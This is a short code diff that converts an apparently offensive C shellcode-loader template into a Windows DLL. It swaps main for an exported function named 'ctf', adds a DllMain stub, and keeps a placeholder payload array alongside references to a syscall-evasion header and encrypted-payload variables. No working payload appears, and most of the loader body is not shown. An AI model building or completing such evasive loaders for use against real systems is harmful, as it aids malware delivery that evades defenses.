@@ -1,5 +1,5 @@
 #include <stdio.h>
-#include <Windows.h>
+#include <windows.h>
 
 #include "whispers.h"
 #include "functions.h"
@@ -16,9 +16,11 @@ unsigned char payload[] = {
 	#-PAYLOAD_VALUE-#
 };
 
-int main() {
 
-	SIZE_T		sEncPayload			= sizeof(payload);
+extern __declspec(dllexport) int ctf()
+{
+
+    SIZE_T		sEncPayload			= sizeof(payload);
 	PVOID		pClearText			= NULL,
 				pProcess			= NULL;
 	DWORD		dwSizeOfClearText	= 0,
@@ -98,4 +100,18 @@ int main() {
 	free(pClearText);
 
 	return 0;
+
+} 
+
+BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
 }
